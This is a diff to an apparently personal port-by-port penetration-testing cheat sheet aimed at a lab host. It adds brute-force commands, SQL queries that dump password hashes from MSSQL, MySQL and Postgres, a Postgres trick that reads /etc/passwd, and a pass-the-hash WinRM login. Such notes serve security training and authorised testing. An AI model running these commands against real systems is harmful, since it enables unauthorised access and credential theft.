@@ -98,7 +98,9 @@ nmap -sV -v --script=nfs-showmount 192.168.200.5
 nmap -p 111,2049 -v --script nfs* 192.168.200.5
 sudo showmount -e 192.168.200.5
 mkdir secrets
-su mount -t nfs 192.168.200.5/secrets secrets/
+sudo mount -t nfs 192.168.200.5/secrets secrets/
+sudo mount -o rw,vers=2 192.168.200.5:/secrets secrets/
+sudo mount -o nolock 192.168.200.5:/secrets secrets/   #older NFS
 cd secrets; grep -irl password
 
 # 113 IDENT
@@ -149,8 +151,18 @@ firefox ~/lab/ldap/domain_users.html
 Port 1030/1032/1033/1038
 Used by RPC to connect in domain network. Usually nothing.
 
+#1100 Java RMI
+nmap -Pn -sV -p 1100 --script="banner,rmi-vuln-classloader,rmi-dumpregistry" -oN "tcp_110_rmi_nmap.txt" 192.168.200.5
+
 # 1433 MSSQL
 sudo nmap -p 1433 -v --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV 192.168.200.5 -oG nmap-mssql 
+mssqlclient.py -db msdb hostname/sa:paxxword@192.168.200.5
+SELECT name FROM master.dbo.sysdatabases
+SELECT * FROM secretdb.INFORMATION_SCHEMA.TABLES
+SELECT sp.name AS login, sp.type_desc AS login_type, sl.password_hash, sp.create_date, sp.modify_date, 
+CASE WHEN sp.is_disabled = 1 THEN 'Disabled' ELSE 'Enabled' END AS status 
+FROM sys.server_principals sp LEFT JOIN sys.sql_logins sl ON sp.principal_id = sl.principal_id 
+WHERE sp.type NOT IN ('G', 'R') ORDER BY sp.name 
 
 # 1521 ORACLE
 tnscmd10g version -h 192.168.200.5
@@ -168,26 +180,45 @@ nmap -p 3306 -v --script mysql-brute -T5 -nv 192.168.200.5
 mysql -h 192.168.200.5 -u root -p
 mysql -h 192.168.200.5 --port=3306 --user=root -p 
 mysql -h 192.168.200.5 -uroot -ppassword -e 'show databases;' 
-show databases; use previse; show tables; select * from accounts; 
+show databases; use previse; show tables; show variables; show grants; select * from accounts; 
+SELECT user,password,authentication_string,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv FROM mysql.user WHERE user = 'root';
+SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;     
+SELECT user FROM mysql.user WHERE file_priv='Y';
 
 # 3389 RDP Remote Desktop
+nmap -Pn -sV -p 3389 --script="banner,(rdp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" 192.168.200.5
 rdesktop -u guest -p guest 192.168.200.5 -g 94%
 hydra -t 1 -V -f -l bob -P $commontenk rdp://192.168.200.5
 ncrack -vv --user Administrator -P $smallpw rdp://192.168.200.5
 xfreerdp /v:192.168.200.5 /d:mike.com /u:bob /p:paxxword -sec-nla +clipboard /geometry /w:1680 /h:900
 
+# 5060 SIP (UDP)
+svmap 192.168.200.5
+svwar -m INVITE -e 200-250 192.168.200.5
+
 # 5437 Postgres
 psql -h 192.168.200.5 -U postgres -p 5437
-\list
-\c secretdb
-\d
+PGPASSWORD=postgres psql -h 192.168.200.5 -p 5437 -U postgres
+\list; \c secretdb; \d table; \du+
+SELECT datname FROM pg_database;
+SELECT current_setting ('is_superuser');
 select * from users; 
+SHOW config_file;
+CREATE TABLE demo(t text);COPY demo FROM '/etc/passwd';SELECT * FROM demo;
+SELECT usename, passwd from pg_shadow;
+
+#5900 VNC
+nmap -Pn -sV -p 5900 --script="banner,(vnc* or realvnc* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args="unsafe=1" 192.168.200.5
 
 # 5985 WinRM
 Microsoft HTTPAPI httpd 2.0
 evil-winrm -i 192.168.200.5 -u mike -p helps
 evil-winrm -i 192.168.200.5 -u administrator -H 7dfclsdfklesk..
- 
+
+# 8009 AJP (Apache Jserv Protocol)
+nmap -Pn -sV -p 8009 -n --script ajp-auth,ajp-headers,ajp-methods,ajp-request 192.168.200.5
+
+
 ===================================
 # Consider
 mxweb mxcurls mxsamba mxbrutes
